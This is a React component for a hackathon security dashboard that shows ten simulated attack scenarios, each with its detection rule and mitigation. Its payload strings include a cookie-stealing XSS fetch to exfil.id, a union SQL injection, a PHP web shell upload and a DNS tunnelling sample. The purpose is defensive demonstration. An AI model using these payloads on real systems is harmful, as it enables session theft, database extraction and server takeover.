/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 * NUSANTARA-SMS - Competition Demo Lab (Kartika Cyber Hackathon 2026)
 * 10 Real Defensive Scenarios Suite
 */

import React, { useState } from 'react';
import {
  FlaskConical,
  Play,
  CheckCircle2,
  AlertTriangle,
  Bot,
  Shield,
  Layers,
  ArrowRight,
  Terminal,
  Activity,
  FileCheck,
} from 'lucide-react';
import { SimulationScenario, SecurityEvent } from '../types/cybersecurity.js';

interface DemoLabViewProps {
  onSimulationTriggered: (scenarioId: string) => Promise<SecurityEvent | null>;
  onNavigateToTab: (tab: any) => void;
  onTriggerAiAnalysis: (incidentId: string) => void;
}

export const DemoLabView: React.FC<DemoLabViewProps> = ({
  onSimulationTriggered,
  onNavigateToTab,
  onTriggerAiAnalysis,
}) => {
  const [runningScenarioId, setRunningScenarioId] = useState<string | null>(null);
  const [completedSimulations, setCompletedSimulations] = useState<Record<string, SecurityEvent>>({});
  const [selectedScenarioId, setSelectedScenarioId] = useState<string>('SCN-02');

  const scenarios: SimulationScenario[] = [
    {
      id: 'SCN-01',
      name: 'Suspicious Authentication Activity',
      description: 'Multiple concurrent login attempts from conflicting geographical IP ranges (Jakarta vs Bucharest) within 72 seconds for admin user.',
      targetAsset: 'WS-001 (Engineering)',
      mitreTechnique: 'T1078 Valid Accounts',
      severity: 'medium',
      simulatedPayload: 'AUTH_EVENT: User=admin Status=SUCCESS IP=185.120.44.11 Geo=RO-Buc; Previous session active from IP=103.22.10.4 Geo=ID-JKT (TimeDelta=72s)',
      detectionMechanism: 'Impossible Travel Behavioral Correlation Rule #AUTH-402',
      recommendedMitigation: 'Trigger immediate step-up MFA challenge and force logout of all concurrent sessions.',
    },
    {
      id: 'SCN-02',
      name: 'SQL Injection Detection',
      description: 'Adversary probes public authentication endpoint with Union-based SQL injection to extract user credential hashes.',
      targetAsset: 'NGFW Perimeter (PaloAlto/Suricata)',
      mitreTechnique: 'T1190 Exploit Public-Facing Application',
      owaspRef: 'OWASP A03:2021-Injection',
      severity: 'critical',
      simulatedPayload: "POST /api/v1/auth/login HTTP/2 { username: \"admin' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -\" }",
      detectionMechanism: 'Nusantara WAF libinjection regex + AST anomaly parser (CRS Rule 942100)',
      recommendedMitigation: 'WAF blocks HTTP request with 403 Forbidden; IP added to temporary 1-hour drop table.',
    },
    {
      id: 'SCN-03',
      name: 'Stored Cross-Site Scripting (XSS)',
      description: 'Injection of malicious JavaScript tag in user profile bio aimed at stealing SOC analyst session cookies.',
      targetAsset: 'NGFW Perimeter (PaloAlto/Suricata)',
      mitreTechnique: 'T1189 Drive-by Compromise',
      owaspRef: 'OWASP A03:2021-Injection',
      severity: 'high',
      simulatedPayload: '<svg onload="fetch(\'https://exfil.id/c?\'+btoa(document.cookie))">',
      detectionMechanism: 'Nusantara WAF HTML Entity Sanitizer & Content Security Policy (CSP) violation report',
      recommendedMitigation: 'Strip unsanitized tags, enforce strict CSP directive script-src self.',
    },
    {
      id: 'SCN-04',
      name: 'Network Port Scan Detection',
      description: 'Rapid TCP SYN scan targeting ports 21, 22, 80, 443, 3306, 5432 across the internal server subnet.',
      targetAsset: 'FIN-SRV-01',
      mitreTechnique: 'T1046 Network Service Discovery',
      severity: 'medium',
      simulatedPayload: 'SYN Packet Burst: 120 pkts/sec from 192.168.100.84 against 10.0.4.0/24 range; flag flags=[S] seq=random',
      detectionMechanism: 'Suricata preprocessor threshold: alert tcp any any -> $HOME_NET any (threshold: type both, count 25, seconds 5)',
      recommendedMitigation: 'Rate-limit SYN packets on core switch, silence RST replies on unused ports.',
    },
    {
      id: 'SCN-05',
      name: 'DNS Anomaly & Tunneling Detection',
      description: 'Staged exfiltration of sensitive payload via repetitive high-entropy Base64-encoded DNS TXT queries.',
      targetAsset: 'WS-003 (Admin Bastion)',
      mitreTechnique: 'T1048.003 Exfiltration Over Alternative Protocol',
      severity: 'critical',
      simulatedPayload: 'DNS QUERY TXT: dGhpcyBpcyBhbiBleGZpbHRyYXRpb24gc2FtcGxl.c2-ns1.adversary-domain.biz [Entropy: 4.95, Length: 64]',
      detectionMechanism: 'Zeek NSM DNS parser calculating Shannon entropy > 4.2 with TXT query frequency anomaly',
      recommendedMitigation: 'Redirect rogue external DNS queries to internal sinkhole; block port 53 outbound at perimeter.',
    },
    {
      id: 'SCN-06',
      name: 'Suspicious Web Shell File Upload',
      description: 'Adversary uploads polyglot PHP web shell disguised with JPEG magic bytes (FF D8 FF) and double extension.',
      targetAsset: 'NGFW Perimeter (PaloAlto/Suricata)',
      mitreTechnique: 'T1505.003 Server Software Component: Web Shell',
      owaspRef: 'OWASP A04:2021-Insecure Design',
      severity: 'critical',
      simulatedPayload: 'Content-Disposition: form-data; name="avatar"; filename="avatar.jpg.php"\\r\\nContent-Type: image/jpeg\\r\\n\\xFF\\xD8\\xFF\\xE0<?php system($_GET[\'cmd\']); ?>',
      detectionMechanism: 'Nusantara Upload Inspector: MIME validation vs file extension and ClamAV shell signature',
      recommendedMitigation: 'Quarantine file immediately, enforce random UUID filename on unexecutable object storage bucket.',
    },
    {
      id: 'SCN-07',
      name: 'Distributed SSH Brute Force',
      description: 'Coordinated credential guessing attack originating from 6 separate botnet IPs against host port 22.',
      targetAsset: 'FIN-SRV-01',
      mitreTechnique: 'T1110.001 Password Guessing',
      severity: 'high',
      simulatedPayload: 'sshd: 72 failed login attempts within 30 seconds for root, admin, ubuntu from rotating IPs',
      detectionMechanism: 'Wazuh Rule ID 5710 (sshd: Multiple failed logins) correlated with Fail2ban multi-source engine',
      recommendedMitigation: 'Enforce public key only auth (PasswordAuthentication no); implement Port Knocking or VPN boundary.',
    },
    {
      id: 'SCN-08',
      name: 'Unauthorized Access Attempt (IDOR)',
      description: 'Manipulated REST API URL path to retrieve another customer financial statement without proper tenant isolation.',
      targetAsset: 'FIN-SRV-01',
      mitreTechnique: 'T1552 Unsecured Credentials',
      owaspRef: 'OWASP A01:2021-Broken Access Control',
      severity: 'high',
      simulatedPayload: 'GET /api/v1/accounts/109284/transactions HTTP/1.1 (JWT token user_id=88319, mismatched tenant claim)',
      detectionMechanism: 'Nusantara API Security Policy Validator (Token claims vs URI parameter inspection)',
      recommendedMitigation: 'Return 403 Forbidden, log security violation audit record, revoke token on repeated mismatch.',
    },
    {
      id: 'SCN-09',
      name: 'Suspicious Outbound C2 Connection',
      description: 'Host establishing non-standard TLS beaconing on port 8443 to known malicious bulletproof hosting IP.',
      targetAsset: 'FIN-SRV-01',
      mitreTechnique: 'T1071.001 Web Protocols (C2)',
      severity: 'critical',
      simulatedPayload: 'CONNECT 185.220.101.5:8443 TLSv1.3 [JA3 Fingerprint: e7d705a3283e0b3e300d3df98de16b8b matched Cobalt Strike]',
      detectionMechanism: 'Suricata TLS JA3 engine matched Threat Intel IOC database (Score: 98/100)',
      recommendedMitigation: 'Sever connection with TCP Reset; initiate automated Host Isolation on FIN-SRV-01.',
    },
    {
      id: 'SCN-10',
      name: 'File Integrity Monitoring (FIM) Change',
      description: 'Critical system authentication binary /bin/login and /etc/shadow modified outside authorized maintenance window.',
      targetAsset: 'FIN-SRV-01',
      mitreTechnique: 'T1556 Modify Authentication Process',
      severity: 'critical',
      simulatedPayload: "syscheck: File '/bin/login' modified. MD5 before: 4f183... after: a99c2... Inode changed by PID 4410",
      detectionMechanism: 'Wazuh Real-Time Syscheck (Inotify file hash watcher on /bin, /sbin, /etc)',
      recommendedMitigation: 'Trigger immediate host snapshot rollback and isolate host from production routing.',
    },
  ];

  const handleRunSimulation = async (scenario: SimulationScenario) => {
    setRunningScenarioId(scenario.id);
    try {
      const generatedEvent = await onSimulationTriggered(scenario.id);
      if (generatedEvent) {
        setCompletedSimulations((prev) => ({ ...prev, [scenario.id]: generatedEvent }));
      }
    } finally {
      setRunningScenarioId(null);
    }
  };

  const activeScenario = scenarios.find((s) => s.id === selectedScenarioId) || scenarios[1];
  const activeSimEvent = completedSimulations[activeScenario.id];

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 bg-[#101827] border border-[#16233B] rounded-xl p-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-[#152338] border border-[#16C79A]/40 flex items-center justify-center text-[#16C79A]">
            <FlaskConical className="w-5 h-5" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-base font-bold text-[#E8EEF7]">Competition Demo Lab & Verification Suite</h1>
              <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-[#F5B942]/20 text-[#F5B942] border border-[#F5B942]/30 font-bold">
                ISOLATED DEFENSIVE SANDBOX
              </span>
            </div>
            <p className="text-xs text-[#8E9EB5]">
              Kartika Cyber Hackathon 2026: 10 authentic defensive attack scenarios with real-time detection, MITRE/OWASP attribution, and AI triage.
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2 text-xs font-mono">
          <span className="text-[#8E9EB5]">Simulations Executed:</span>
          <span className="text-[#16C79A] font-bold text-sm">{Object.keys(completedSimulations).length} / 10</span>
        </div>
      </div>

      {/* Main Grid: 10 Scenarios selector & Live Execution Workbench */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
        {/* Scenarios Sidebar - 5 cols */}
        <div className="lg:col-span-5 bg-[#101827] border border-[#16233B] rounded-xl p-3 space-y-2">
          <div className="text-xs font-semibold text-[#E8EEF7] pb-2 border-b border-[#16233B] flex items-center justify-between">
            <span>10 Defensive Scenarios</span>
            <span className="text-[10px] font-mono text-[#64748B]">Click to test</span>
          </div>

          <div className="space-y-1.5 max-h-[580px] overflow-y-auto pr-1">
            {scenarios.map((sc) => {
              const hasRun = !!completedSimulations[sc.id];
              const isSelected = selectedScenarioId === sc.id;

              return (
                <div
                  key={sc.id}
                  onClick={() => setSelectedScenarioId(sc.id)}
                  className={`p-2.5 rounded-xl border text-xs cursor-pointer transition-all ${
                    isSelected
                      ? 'bg-[#152338] border-[#16C79A]/60 shadow-md'
                      : 'bg-[#080D17] border-[#16233B] hover:border-[#1E2D4A]'
                  }`}
                >
                  <div className="flex items-center justify-between mb-1">
                    <span className="font-mono font-bold text-[#36A3FF]">{sc.id}</span>
                    <div className="flex items-center gap-1.5">
                      {hasRun && (
                        <span className="px-1.5 py-0.2 rounded bg-[#16C79A]/20 text-[#16C79A] font-mono text-[9px] font-bold flex items-center gap-1">
                          <CheckCircle2 className="w-2.5 h-2.5" /> DETECTED
                        </span>
                      )}
                      <span
                        className={`px-1.5 py-0.2 rounded text-[9px] font-bold uppercase ${
                          sc.severity === 'critical'
                            ? 'bg-[#EF5350]/20 text-[#EF5350]'
                            : sc.severity === 'high'
                            ? 'bg-[#F5B942]/20 text-[#F5B942]'
                            : 'bg-[#36A3FF]/20 text-[#36A3FF]'
                        }`}
                      >
                        {sc.severity}
                      </span>
                    </div>
                  </div>

                  <h4 className="font-semibold text-[#E8EEF7] text-[11px] mb-0.5">{sc.name}</h4>
                  <div className="text-[10px] text-[#8E9EB5] truncate">{sc.mitreTechnique}</div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Selected Scenario Workbench - 7 cols */}
        <div className="lg:col-span-7 bg-[#101827] border border-[#16233B] rounded-xl p-4 space-y-4 flex flex-col justify-between">
          <div>
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3 border-b border-[#16233B]">
              <div>
                <div className="flex items-center gap-2">
                  <span className="font-mono text-xs font-bold text-[#36A3FF]">{activeScenario.id}</span>
                  <h2 className="text-base font-bold text-[#E8EEF7]">{activeScenario.name}</h2>
                </div>
                <p className="text-xs text-[#8E9EB5] mt-1">{activeScenario.description}</p>
              </div>

              {/* Run Simulation Trigger */}
              <button
                onClick={() => handleRunSimulation(activeScenario)}
                disabled={runningScenarioId === activeScenario.id}
                className="px-4 py-2 bg-[#16C79A] hover:bg-[#16C79A]/90 text-[#080D17] text-xs font-bold rounded-lg flex items-center gap-1.5 transition-all shadow-md shadow-[#16C79A]/20 shrink-0 disabled:opacity-50"
              >
                <Play className={`w-3.5 h-3.5 ${runningScenarioId === activeScenario.id ? 'animate-spin' : ''}`} />
                {runningScenarioId === activeScenario.id ? 'Executing in Sandbox...' : 'Run Simulation'}
              </button>
            </div>

            <div className="space-y-3 mt-3 text-xs">
              <div className="grid grid-cols-2 gap-2">
                <div className="p-2.5 bg-[#080D17] border border-[#16233B] rounded-lg">
                  <span className="text-[10px] text-[#64748B] block">Target Protected Asset</span>
                  <span className="font-semibold text-[#E8EEF7]">{activeScenario.targetAsset}</span>
                </div>
                <div className="p-2.5 bg-[#080D17] border border-[#16233B] rounded-lg">
                  <span className="text-[10px] text-[#64748B] block">Attack Severity</span>
                  <span className="font-semibold uppercase text-[#EF5350]">{activeScenario.severity}</span>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-2">
                <div className="p-2.5 bg-[#080D17] border border-[#16233B] rounded-lg">
                  <span className="text-[10px] text-[#64748B] block">MITRE ATT&CK Technique</span>
                  <span className="font-mono text-[#36A3FF] font-semibold">{activeScenario.mitreTechnique}</span>
                </div>
                <div className="p-2.5 bg-[#080D17] border border-[#16233B] rounded-lg">
                  <span className="text-[10px] text-[#64748B] block">OWASP Framework Tag</span>
                  <span className="font-mono text-[#F5B942] font-semibold">{activeScenario.owaspRef || 'N/A (Host/Network Level)'}</span>
                </div>
              </div>

              <div>
                <span className="text-[#8E9EB5] block mb-1 font-semibold">Simulated Attack Payload:</span>
                <pre className="p-2.5 bg-[#05080F] border border-[#16233B] rounded-lg text-[#F5B942] font-mono text-[11px] overflow-x-auto whitespace-pre-wrap">
                  {activeScenario.simulatedPayload}
                </pre>
              </div>

              <div>
                <span className="text-[#16C79A] block mb-1 font-semibold">Defensive Detection Engine:</span>
                <div className="p-2.5 bg-[#080D17] border border-[#16233B] rounded-lg text-[#CBD5E1]">
                  {activeScenario.detectionMechanism}
                </div>
              </div>

              <div>
                <span className="text-[#36A3FF] block mb-1 font-semibold">Recommended Mitigation:</span>
                <div className="p-2.5 bg-[#080D17] border border-[#16233B] rounded-lg text-[#E8EEF7]">
                  {activeScenario.recommendedMitigation}
                </div>
              </div>
            </div>
          </div>

          {/* Verification Results Bar */}
          <div className="pt-3 border-t border-[#16233B] flex flex-wrap items-center justify-between gap-2">
            <div className="flex items-center gap-2">
              {activeSimEvent ? (
                <span className="flex items-center gap-1.5 text-xs text-[#16C79A] font-semibold">
                  <CheckCircle2 className="w-4 h-4" />
                  Correlated Event Ingested: <span className="font-mono">{activeSimEvent.id}</span>
                </span>
              ) : (
                <span className="text-xs text-[#64748B]">Ready to execute safe simulation in sandbox</span>
              )}
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => onNavigateToTab('monitoring')}
                className="px-3 py-1.5 bg-[#152338] hover:bg-[#1E2D4A] text-[#E8EEF7] text-xs font-semibold rounded-lg transition-colors flex items-center gap-1"
              >
                <Terminal className="w-3.5 h-3.5 text-[#36A3FF]" /> View in Live Feed
              </button>
              <button
                onClick={() => onTriggerAiAnalysis('INC-2847')}
                className="px-3 py-1.5 bg-[#16C79A]/20 hover:bg-[#16C79A]/30 text-[#16C79A] border border-[#16C79A]/40 text-xs font-bold rounded-lg transition-colors flex items-center gap-1"
              >
                <Bot className="w-3.5 h-3.5" /> Analyze with AI
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
